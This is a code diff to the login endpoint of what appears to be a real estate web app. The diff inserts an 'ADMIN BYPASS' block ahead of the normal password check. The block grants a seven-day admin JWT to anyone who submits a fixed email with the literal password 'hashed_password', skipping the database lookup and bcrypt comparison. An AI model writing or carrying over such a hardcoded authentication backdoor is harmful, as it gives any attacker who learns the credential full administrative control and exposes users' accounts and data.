@@ -476,6 +476,15 @@ app.post('/api/auth/login', loginLimiter, async (req, res) => {
     if (!email || !password)
       return res.status(400).json({ message: 'Email and password required' });
 
+    // ─── ADMIN BYPASS (Easy to remove) ──────────────────────────────────────────
+    if (email.toLowerCase().trim() === 'admin@zimarealestate.com' && password === 'hashed_password') {
+      const token = jwt.sign({ id: 'admin_root', role: 'admin' }, JWT_SECRET, { expiresIn: '7d' });
+      return res.json({
+        token,
+        user: { _id: 'admin_root', username: 'Zima Admin', email: 'admin@zimarealestate.com', role: 'admin', isEmailVerified: true, isKycVerified: true }
+      });
+    }
+
     const user = await User.findOne({ email: String(email).toLowerCase().trim() });
 
     // Constant-time compare: always run bcrypt even if user not found,
